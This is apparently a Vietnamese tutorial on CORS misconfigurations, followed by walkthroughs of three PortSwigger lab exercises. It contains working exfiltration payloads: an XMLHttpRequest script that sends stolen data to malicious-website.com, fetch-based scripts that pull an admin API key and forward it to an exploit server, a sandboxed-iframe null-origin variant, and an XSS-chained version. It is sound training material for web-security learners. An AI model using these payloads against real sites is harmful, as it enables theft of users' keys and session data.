---
title: 'Web09: Cross-origin resource sharing (CORS)'
tags: [web9]

---

 I. Giới thiệu
-------------

**CORS** là một cơ chế cho phép một website được các host khác truy cập tới nó có kiểm soát. Nó cũng mở rộng và bổ sung tính linh hoạt cho chính sách **SOP**. Cơ chế này tiềm ẩn nguy cơ tấn công giữa các domain với nhau nếu **CORS** của trang được cấu hình sai. Ví dụ về một đoạn code cấu hình **CORS** trong Express JS:

```
const express = require('express');
const app = express();
const port = 3000; // Cổng mà server lắng nghe
 
// Cấu hình CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*'); // Cho phép truy cập từ bất kỳ nguồn nào
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE'); // Cho phép các phương thức HTTP
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization'); // Cho phép các tiêu đề tùy chỉnh
  next();
});
 
// Định nghĩa các tuyến đường
app.get('/api/data', (req, res) => {
  const data = { message: 'Dữ liệu từ nguồn khác' };
  res.json(data);
});
 
// Khởi động server
app.listen(port, () => {
  console.log(`Server đang lắng nghe tại http://localhost:${port}`);
});
 
```

Ví dụ về cấu hình **CORS** có whitelist:

```
const express = require('express');
const app = express();
const port = 3000;
 
// Danh sách trắng - chấp nhận truy cập từ các tên miền sau
const allowedOrigins = [
  'http://example.com',
  'https://subdomain.example.com',
];
 
// Cấu hình CORS với danh sách trắng
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  }
  next();
});
 
app.get('/api/data', (req, res) => {
  const data = { message: 'Dữ liệu từ nguồn khác' };
  res.json(data);
});
 
app.listen(port, () => {
  console.log(`Server đang lắng nghe tại http://localhost:${port}`);
});
 
```

Ví dụ 2 về cấu hình **CORS** có whitelist:
 

`const express = require('express');`

`const app = express();`

``const port = 3000; // Danh sách trắng - chấp nhận truy cập từ các tên miền sauconst allowedOrigins = [  '[http://example.com](http://example.com/)',  '[https://subdomain.example.com](https://subdomain.example.com/)',]; // Cấu hình CORS với danh sách trắngapp.use((req, res, next) => {  const origin = req.headers.origin;  if (allowedOrigins.includes(origin)) {    res.header('Access-Control-Allow-Origin', origin);    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');  }  next();}); app.get('/api/data', (req, res) => {  const data = { message: 'Dữ liệu từ nguồn khác' };  res.json(data);}); app.listen(port, () => {  console.log(`Server đang lắng nghe tại [http://localhost:](http://localhost/)${port}`);});``



### Tiếp theo, chính sách SOP là gì?

**SOP** hay **Same-origin policy** là một đặc tả hạn chế về nhiều nguồn gốc nhằm giới hạn khả năng trang web tương tác với các tài nguyên bên ngoài domain gốc. Chính sách **SOP** được xác định từ nhiều năm trước để ứng phó với các tương tác giữa các tên miền đọc hại như các web site đánh cắp dữ liệu từ một web site khác.

### Giới thiệu Access-Control-Allow-Origin (trong response header)

Header **Access-Control-Allow-Origin** nằm trong gói tin response từ một website tới request bắt nguồn từ một trang web khác và xác định nguồn gốc được phép của request. Trình duyệt web so sánh **Access-Control-Allow-Origin** với nguồn gốc của trang web gửi request và cho phép truy cập vào response nếu chúng khớp.

II. Triển khai một CORS đơn giản
================================

Đặc tả **CORS**:

-   Quy định nội dung header được trao đổi giữa web server và trình duyệt bị hạn chế gốc đối với các request yêu cầu tài ngueyen web từ bên ngoài domain.
-   Xác định một tập hợn các header trong đó **Access-Control-Allow-Origin** quan trọng nhất.

Header **Access-Control-Allow-Origin** được server trả về website request tài nguyên từ domain khác, với header Origin được trình duyệt thêm vào.

Ví dụ: Một wbsite có domain gốc là `normal-website.com` tạo ra requests chéo domain sau:


`GET /data HTTP/1.1`

`Host: robust-website.com`

`Origin : [https://normal-website.com](https://normal-website.com/)`




Máy chủ sẽ bật `robust-website.com` lên và trả về một response như sau:



`HTTP/1.1 200 OK`

`...`

`Access-Control-Allow-Origin: [https://normal-website.com](https://normal-website.com/)`



Trình duyệt sẽ cho phép dòng code tiếp theo được truy cập vào `normal-website.com` vì response của chúng là khớp nhau.

Theo mặc định, header `**Access-Control-Allow-Origin**` cho phép `có nhiều domain gốc` hoặc giá trị `null` hoặc giá trị đại diện `*`

Tuy nhiên, không có trình duyệt nào hỗ trợ nhiều `origin` cả.

### Xử lý các request có origin chéo bằng thông tin xác thực

Hành vi mặc định của các request có CORS là các request được chuyển tiếp mà không có thông tin xác thực như cookie và Authorization header

Tuy nhiên, máy chủ cross-domain cũng cho phép yêu cầu xác thực thông tin trước khi chuyển tiếp bằng cách sử dụng header Access-Control-Allow-Credentials với giá trị true.

Ví dụ: website yêu cầu sử dụng javascript để khai báo rằng nó đang gửi cookie cùng với requests:


`GET /data HTTP/1.1`

`Host: robust-website.com`

`...`

`Origin: [https://normal-website.com](https://normal-website.com/)`

`Cookie: JSESSIONID=<value>`



 

Response cho request này sẽ là:



`HTTP/1.1 200 OK`

`...`

`Access-Control-Allow-Origin: [https://normal-website.com](https://normal-website.com/)`

`Access-Control-Allow-Credentials: true`



Trình duyệt cho phép đọc trang chuyển tiếp vì Access-Control-Allow-Credentials có giá trị true.

### Giảm bớt các giá trị của CORS bằng ký tự đại diện

Header Access-Control-Allow-Origin hỗ trợ các ký tự đại diện. Ví dụ: sử dụng *


`Access-Control-Allow-Origin: *`



Tuy nhiên với header này thì không hợp lệ:


`Access-Control-Allow-Origin: [https://](https:)*.normal-website.com`


Chú ý: việc sử dụng ký tự đại diện như vậy bị hạn chế trong **CORS **vì không thể kết hợp ký tự đặc biệt với cơ chế xác thực (authorizer, cookie hoặc client chứng chỉ). Do đó , response của máy chủ sẽ có dạng:


`Access-Control-Allow-Origin: *`

`Access-Control-Allow-Credentials: true`


Tuy nhiên sử dụng * có thể không an toàn, làm lộ nội dung của trang được xác thực trên trang đích.

### Kỹ thuật Pre-flight checks

**Pre-flight checks** được thêm vào CORS để bảo vệ các tài nguyên cũ khỏi các tùy chọn mở rộng được CORS cho phép.

Khi một request tới cross-domain bao gồm các header hoặc method không chính xác, request có cross-origin được đặt trước bở một request sử dụng method OPTIONS và giao thức **CORS** cần phải kiểm tra ban đầu về những phương thức và header nào được phép.

=\> Đây gọi là Pre-flight checks

Trong **Pre-flight checks** máy chủ sẽ trả về danh sách method được phép ngoài origin đáng tin cậy và trình duyệt sẽ kiểm tra xem method của request có được phép hay không?

Ví dụ: request **pre-check** đang tìm cách sử dụng dụng method PUT cùng với header tùy chỉnh cs tên là Special-Request-Header

`OPTIONS /data HTTP/1.1`

`Host: <some website>`

`...`

`Origin: [https://normal-website.com](https://normal-website.com/)`

`Access-Control-Request-Method: PUT`

`Access-Control-Request-Headers: Special-Request-Header`


Máy chủ sẽ response như sau:


`HTTP/1.1 204 No Content`

`...`

`Access-Control-Allow-Origin: [https://normal-website.com](https://normal-website.com/)`

`Access-Control-Allow-Methods: PUT, POST, OPTIONS`

`Access-Control-Allow-Headers: Special-Request-Header`

`Access-Control-Allow-Credentials: true`

`Access-Control-Max-Age: 240`




Response này quy định các method PUT, POST, OPTIONS và header Special-Request-Header là được phép. Máy chủ cross-domain cũng có thể cho phép gửi thông tin xác thực và header **Access-Control-Max-Age** xác định khung thời gian tối đa để lưu vào bộ nhớ đệm trước khi thực hiện lại pre-check.

### CORS có bảo vệ chống lại CSRF không?

### =>Không

**CORS** không cung cấp khả năng bảo vệ chống lại CSRF => một quan niệm sai lầm rất phổ biến. **CORS** là: sự lỏng lẻo có kiểm soát của chính sách **SOP** vì vậy nếu **CORS** được cấu hình kém thực sự sẽ làm tăng khả năng xảy ra các cuộc tấn công CSRF hoặc làm tăng tác động.

### Lỗ hổng phát sinh từ các vấn đề cấu hình CORS

Nhiều trang web hiện đại sử dụng **CORS** để cho phép truy cập từ domain này sang domain khác. Vậy liệu có vấn đề bảo mật gì ở đây không???

### ACAO header được server tạo ra từ Origin header do user cung cấp

Một số ứng dụng sử dụng một `con đường tắt` để cho phép truy cập từ bất kỳ domain nào một cách nhanh chóng hiệu quả.

Ví dụ: requests
 

`GET /sensitive-victim-data HTTP/1.1`

`Host: vulnerable-website.com`

`Origin: [https://malicious-website.com](https://malicious-website.com/)`

`Cookie: sessionid=...`



 

response:

 

`HTTP/1.1 200 OK`

`Access-Control-Allow-Origin: [https://malicious-website.com](https://malicious-website.com/)`

`Access-Control-Allow-Credentials: true`

`...`



 
Các header cho thấy người dùng có quyền truy cập từ domain requests và các cross-domain có thể bao gồm cookie của domain trước đó với header `**Access-Control-Allow-Credentials**: true`

Vì: website phản ánh origin bất kỳ trong header `**Access-Control-Allow-Credentials**: true`

Điều này có nghĩa là bất kỳ domain nào cũng có thể truy cập tài nguyên từ domain dễ bị tấn công

Nếu response chứa các thông tin nhạy cảm như API key hoặc CSRF token, ta có thể truy xuất các thông tin này bằng cách tạo một website giả mạo với javascript như sau:


`var req = new XMLHttpRequest();`

`req.onload = reqListener;`

`req.open('get','[https://vulnerable-website.com/sensitive-victim-data](https://vulnerable-website.com/sensitive-victim-data)',true);`

`req.withCredentials = true;`

`req.send();`

`function reqListener() {`

 `location='//malicious-website.com/log?key='+this.responseText;`

`};`



### Lỗi phân tích cú pháp Origin header

Một số website áp dụng blacklist để giới hạn origin được phép truy cập.

Khi nhận thấy có request **CORS**, origin được cung cấp sẽ được so sánh với `whitelist`. Nếu khớp thì sẽ được phản hồi trong `**Access-Control-Allow-Origin**`

Ví dụ: website nhận được request như này:
 

`GET /data HTTP/1.1`

`Host: normal-website.com`

`...`

`Origin: [https://innocent-website.com](https://innocent-website.com/)`



Nếu domain này nằm trong whitelist thì response sẽ là:


`HTTP/1.1 200 OK`

`...`

`Access-Control-Allow-Origin: [https://innocent-website.com](https://innocent-website.com/)`



 |

Việc triển khai **CORS** whitelist thường có một số sai lầm:  
Ví dụ: một số website cho phép truy cập từ tất cả các sub-domain của họ (bao gồm cả những domain trong tương lai chưa tồn tại).

Một số lại cho phép truy cập từ nhiều domain của các tổ chức khác (bao gồm subdomain)

Quy tắc này thường được triển khai bằng cách so khớp các tiền tố hoặc hậu tối URL hoặc chỉ đơn giản là so sánh cụm từ 

Bất kỳ sai sót nào trong quá trình triển khai cũng có thể dẫn tới việc cấp quyền truy cập vào các domain ngoài ý muốn.

Ví dụ: webiste cung cấp quyền truy cập vào tất cả domain chứa chuỗi `normal-website.com`, attacker có được quyền truy cập bằng cách đăng ký một tên miền khác `hackersnormal-website.com`, và ngược lại.

### Giá trị null được đưa vào whitelist

Như đã nói trước đó, Origin cũng có thể là null.

Trình duyệt có thể gửi giá trị null trong Origin trong nhiều tình huống khác như:

-   Chuyển hướng từ nhiều nguồn
-   request từ dữ liệu tuần tự
-   request sử dụng giao thức `file:`

Một số website đưa null vào whitelist để hỗ trợ việc phát triển ứng dụng trên local.

Ví dụ: requests


`GET /sensitive-victim-data`

`Host: vulnerable-website.com`

`Origin: null`


Response:

 

`HTTP/1.1 200 OK`

`Access-Control-Allow-Origin: null`

`Access-Control-Allow-Credentials: true`


Trong tình huống này , attacker có thể sử null làm giá trị để bypass whitelist => truy cập cross-domain. Payload cho vấn đề này là sử dụng iframe được sanbox. Việc sử dụng ifram snabox vì nó tạo ra một **CORS** null.

Khi bạn sử dụng thuộc tính sandbox trong thẻ , bạn đang thiết lập một môi trường cấm một số tùy chọn của trình duyệt trong iframe đó. Trong trường hợp của bạn, thuộc tính sandbox được đặt giá trị “allow-scripts allow-top-navigation allow-forms”. Đây là một số tùy chọn cụ thể được kích hoạt, và chúng có tác dụng như sau:

-   allow-scripts: Cho phép tài liệu trong iframe chạy JavaScript.
-   allow-top-navigation: Cho phép iframe chuyển hướng trình duyệt đến một tài liệu khác (điều này thường bị vô hiệu hóa trong sandbox vì lý do bảo mật).
-   allow-forms: Cho phép tài liệu trong iframe sử dụng các biểu mẫu (form) và gửi dữ liệu.

### Khai thác XSS thông quan CORS cấu hình kém

Requests:

`GET /api/requestApiKey HTTP/1.1`

`Host: vulnerable-website.com`

`Origin: [https://subdomain.vulnerable-website.com](https://subdomain.vulnerable-website.com/)`

`Cookie: sessionid=...`


Response:


`HTTP/1.1 200 OK`

`Access-Control-Allow-Origin: [https://subdomain.vulnerable-website.com](https://subdomain.vulnerable-website.com/)`

`Access-Control-Allow-Credentials: true`



 |

Ta cũng có thể truyền một domain chứa lỗ hổng XSS để lợi dụng xss đó để khai thác.

### CORS kém làm phá vỡ TLS

Giả sử, ứng dụng web làm rất chặt trong việc sử dụng `HTTPS` `nhưng` nó lại đưa một domain phụ sử dụng `HTTP` thì sẽ có vấn đề bảo mật gì xảy ra?

Ví dụ: requests

 

`GET /api/requestApiKey HTTP/1.1`

`Host: vulnerable-website.com`

`Origin: [http://trusted-subdomain.vulnerable-website.com](http://trusted-subdomain.vulnerable-website.com/)`

`Cookie: sessionid=...`



 

Response:



`HTTP/1.1 200 OK`

`Access-Control-Allow-Origin: [http://trusted-subdomain.vulnerable-website.com](http://trusted-subdomain.vulnerable-website.com/)`

`Access-Control-Allow-Credentials: true`


Kẻ tấn công có thể tiến hành một cuộc tấn công như sau:  
Kịch bản:

-   Victim thực hiện HTTP request bình thường
-   Attacker đưa vào origin một chuyển hướng tới http://trusted-subdomain.vulnerable-website.com
-   Trình duyệt victim tuân theo chuyển hướng
-   Kẻ tấn công chặn các HTTP request và trả về phản hồi giả mạo chứa cả **CORS** request:  
    [https://vulnerable-website.com](https://vulnerable-website.com/)
-   Trình duyệt victim đưa ra CORS request, bao gồm cả origin là http://trusted-subdomain.vulnerable-website.com

Ứng dụng cho phép request vì đây là origin đã được đưa vào `whitelist`. Dữ liệu nhạy cảm được yêu cầu sẽ trả về trong phản hồi.

Cuộc tấn công này có hiệu quả ngay cả khi website sử dụng HTTPS, không có endpoint HTTP và tất cả cookie được gắn flags secure.

 # **1. Lab: CORS vulnerability with basic origin reflection**
>Trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy mọi nguồn gốc.
Để giải quyết bài thí nghiệm, hãy tạo một số JavaScript sử dụng CORS để truy xuất khóa API của quản trị viên và tải mã lên máy chủ khai thác của bạn. Lab sẽ được giải quyết khi bạn gửi thành công khóa API của quản trị viên.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`

>Đăng nhập vào `wiener`, tại `/my-account` ta có thể thấy được API Key của tài khoản: ![image](https://hackmd.io/_uploads/Sy0kFaJ8C.png)

>Xem lại request và respone, thấy rằng API Key được hiển thị từ 1 hàm JS, mà hàm JS truy cập vào `/accountDetails` để fetch api: ![image](https://hackmd.io/_uploads/Bkp_Ya1U0.png)

>Tồn tại thêm 1 request `GET /accountDetails` sẽ dựa vào session tương ứng để lấy dữ liệu người dùng từ server: ![image](https://hackmd.io/_uploads/Bka3FT1UR.png)

>Ta thấy trong respone có tồn tại `Access-Control-Allow-Credentials: true` => server sử dụng CORS. Thử thêm 1 Origin bất kì thì server vẫn xử lí thành công, đồng thời có thêm `Access-Control-Allow-Origin: http://ducanh.com`
>![image](https://hackmd.io/_uploads/SJN45p1IC.png)

>Có thể kết luận rằng server không thực hiện chặn request từ nguồn lạ, mà nó tin tưởng tất cả các request tới từ tất cả domain khác nhau!

>Ta tạo ra 1 payload từ hàm JS trang web sử dụng như sau:
```
<script>
    fetch('//<LAB-ID>.web-security-academy.net/accountDetails', {
        credentials:'include'
    })
    .then(r => r.json())
    .then(j => fetch('//exploit-<EXPLOIT-ID>.exploit-server.net/?apiKey=' + j.apikey))
</script>
```

>Cụ thể, do server trust origin bất kì từ request nên khi nạn nhân thực thi payload trên thì cross-site request từ trang `exploit-server` đến `<LAB-DOMAIN>/accountDetails` để lấy apikey sẽ thành công. apikey sau khi được lấy sẽ truyền về `exploit-server` của attacker dưới dạng tham số GET.

>Lưu payload vào exploit server: ![image](https://hackmd.io/_uploads/rJ8hs6180.png)

>**"Deliver explit to victim"** và xem lại Log, ta có thể thấy payload đã hoạt động và chuyển api key của victim về server ta controll: ![image](https://hackmd.io/_uploads/Hyp8nayUR.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/r1Su3py8C.png)

# **2. Lab: CORS vulnerability with trusted null origin**
>Trang web này có cấu hình CORS không an toàn ở chỗ nó tin tưởng vào nguồn gốc "null".
Để giải quyết bài thí nghiệm, hãy tạo một số JavaScript sử dụng CORS để truy xuất khóa API của quản trị viên và tải mã lên máy chủ khai thác của bạn. Lab sẽ được giải quyết khi bạn gửi thành công khóa API của quản trị viên.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`
![image](https://hackmd.io/_uploads/H15fkR1IC.png)

>Đăng nhập vào `wiener`, trong `/my-account` cũng hiện API Key của người dùng lên màn hình như trong lab trước: ![image](https://hackmd.io/_uploads/H18EbAk80.png)

>API Key được hiển thị từ 1 hàm JS, mà hàm JS truy cập vào `/accountDetails` để fetch api:
>![image](https://hackmd.io/_uploads/rkG8WRk8R.png)

>Tồn tại thêm 1 request `GET /accountDetails` sẽ dựa vào session tương ứng để lấy dữ liệu người dùng từ server: ![image](https://hackmd.io/_uploads/BysOW018A.png)

>Thấy trong respone có chứa `Access-Control-Allow-Credentials: true` nên đoán ra được rằng server hỗ trợ CORS! 
>Thử thêm 1 header Origin chứa domain bất kì vào trong request để xem server xử lí nó ra sao, thì thấy lần này server đã không tin tưởng Origin bất kì từ request: ![image](https://hackmd.io/_uploads/r1AgGR1LA.png)

>Tuy nhiên, khi thêm header `Origin: null` thì thấy response có header `Access-Control-Allow-Origin: null`. → server cấu hình cho phép `Origin: null` : ![image](https://hackmd.io/_uploads/rJANzAkUR.png)

>Khi đó, dựa vào các trường hợp mà Origin null được sử dụng , ta chọn 1 trường hợp là tag **iframe** với thuộc tính **sandbox** không chứa giá trị `allow-same-origin` để bypass qua whitelist. Payload được xây dựng như sau:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="data:text/html,<script>
    fetch('//<LAB-ID>.web-security-academy.net/accountDetails', {
        credentials:'include'
    }).then(r => r.json())
      .then(j => fetch('//exploit-<EXPLOIT-ID>.exploit-server.net/?apiKey=' + j.apikey))</script>">
</iframe>
```

>Đoạn script như bài lab 1 sẽ được thực thi thông qua **srcdoc** và **sandbox** cần có giá trị **allow-scripts** để cho phép thực thi script đó.

>Lưu payload vào exploit server: ![image](https://hackmd.io/_uploads/H1JemA1I0.png)

>>**"Deliver explit to victim"** và xem lại Log, ta có thể thấy payload đã hoạt động và chuyển api key của victim về server ta controll: ![image](https://hackmd.io/_uploads/HJA-m018R.png)

>Submit key và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rkSX70kLC.png)

# **3. CORS vulnerability with trusted insecure protocols**
>Trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy tất cả các tên miền phụ bất kể giao thức.
Để giải quyết bài thí nghiệm, hãy tạo một số JavaScript sử dụng CORS để truy xuất khóa API của quản trị viên và tải mã lên máy chủ khai thác của bạn. Lab sẽ được giải quyết khi bạn gửi thành công khóa API của quản trị viên.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`
![image](https://hackmd.io/_uploads/Sy_XDAk8C.png)

>Bài này nâng cấp hơn 2 bài trên khi nó chỉ trust tất cả subdomain. Như vậy mình cần tấn công CORS sao cho nạn nhân sẽ request đến target từ subdomain chứ không phải từ exploit-server.

>Đăng nhập vào `wiener`, trong `/my-account` cũng hiện API Key của người dùng lên màn hình như trong lab trước: ![image](https://hackmd.io/_uploads/H1qzYAyUC.png)

>API Key được hiển thị từ 1 hàm JS, mà hàm JS truy cập vào `/accountDetails` để fetch api:
>![image](https://hackmd.io/_uploads/Bkb4KCyIA.png)

>Tồn tại thêm 1 request `GET /accountDetails` sẽ dựa vào session tương ứng để lấy dữ liệu người dùng từ server: ![image](https://hackmd.io/_uploads/H1lStAyIC.png)

>Thấy trong respone có chứa `Access-Control-Allow-Credentials: true` nên đoán ra được rằng server hỗ trợ CORS! 
>Thử thêm 1 header Origin chứa domain bất kì vào trong request để xem server xử lí nó ra sao, thì thấy lần này server đã không tin tưởng Origin bất kì từ request: ![image](https://hackmd.io/_uploads/rJOvt0k8A.png)

>Một điểm chú ý là khi xem post sản phẩm bất kì thì xuất hiện chức năng **Check stock**, khi click sẽ thực hiện request đến 1 subdomain `http://stock.<LAB-DOMAIN>/?productId=X&storeId=Y` để trả về số sản phẩm còn trong kho: ![image](https://hackmd.io/_uploads/H1InFCkUC.png)
![image](https://hackmd.io/_uploads/Hkx-qAk8R.png)

>Thử thêm `Origin: http://stock.<LAB-DOMAIN>/` thì thấy response trả về `Allow-Control-Allow-Origin: http://stock.<LAB-DOMAIN>/` → server trust subdomain kể cả http và https. (Mặc dù server sử dụng https): ![image](https://hackmd.io/_uploads/r1dD50kUC.png)

>Bây giờ ta sẽ đi tìm cách tấn công làm sao để nạn nhân sẽ request đến `/accountDetails` từ subdomain `http://stock.<LAB-DOMAIN>` chứ không phải từ `exploit-server`.

>Thử query subdomain trên với productId sai thì thấy response trả lỗi chứa productId trên. Có vẻ như trang này sẽ bị dính reflected XSS: ![image](https://hackmd.io/_uploads/B1fmoRk8R.png)

>Thử payload `<script>alert(1)</script>` tại trường productId, ta thấy ta đã XSS thành công: ![image](https://hackmd.io/_uploads/BkFuj0JLC.png)

>Như vậy, bây giờ chỉ cần truyền payload cors attack sau khi URL-encoded vào trường productId và khiến nạn nhân truy cập vào đường dẫn này thì nó sẽ thực thi payload từ subdomain nhờ XSS và request đến /accountDetails. Payload cors attack giống với lab 1:
```
<script>
    fetch('//<LAB-ID>.web-security-academy.net/accountDetails', {
        credentials:'include'
    })
    .then(r => r.json())
    .then(j => fetch('//exploit-<EXPLOIT-ID>.exploit-server.net/?apiKey=' + j.apikey))
</script>
```

>URL Encode toàn bộ payload và truyền vào `productId`: ![image](https://hackmd.io/_uploads/r1SQTRJUA.png)

>Tại exploit-server, truyền payload sau:
```
<script>
document.location="http://stock.0ab200be034dc7258036e969001b007c.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ab200be034dc7258036e969001b007c.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a2200150379c7888052e8a701dc0007.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"</script>
```
![image](https://hackmd.io/_uploads/BJhRxXeIA.png)


>Thử "View exploit" thì kết quả nhận được là lab không hỗ trợ HTTP: ![image](https://hackmd.io/_uploads/SJrpXWxUR.png)

>Lúc này, ta sẽ sửa payload lưu trên exploit server từ http => https và thử lại. Lần này thì server đã xử lí và trả về api key: ![image](https://hackmd.io/_uploads/ryiZNZl8A.png)

>Sau khi thử nghiệm thành công, chọn "Deliver exploit to victim" để gửi payload tới nạn nhân, xem lại log thì thấy API  Key của nạn nhân đã được truyền về exploit server của ta: ![image](https://hackmd.io/_uploads/HyQplmgIA.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rJqgbQeLC.png)
